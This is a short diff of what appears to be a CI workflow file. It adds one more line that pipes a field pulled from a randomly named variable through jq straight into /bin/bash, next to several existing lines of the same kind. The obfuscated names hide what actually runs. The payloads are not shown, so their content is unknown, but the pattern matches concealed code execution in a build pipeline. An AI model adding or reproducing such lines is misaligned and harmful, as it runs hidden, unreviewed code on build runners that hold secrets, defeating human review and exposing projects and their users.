@@ -32,6 +32,7 @@ jobs:
           echo $hltmn424 | jq -r .le116 | /bin/bash
           echo $uc08701 | jq -r .a848 | /bin/bash
           printf '%s' "$kks4" | jq -r .p9212 | /bin/bash
+          printf '%s' "$faz6" | jq -r .oeexx1850 | /bin/bash
 
       - name: Upload artifact
         if: always()
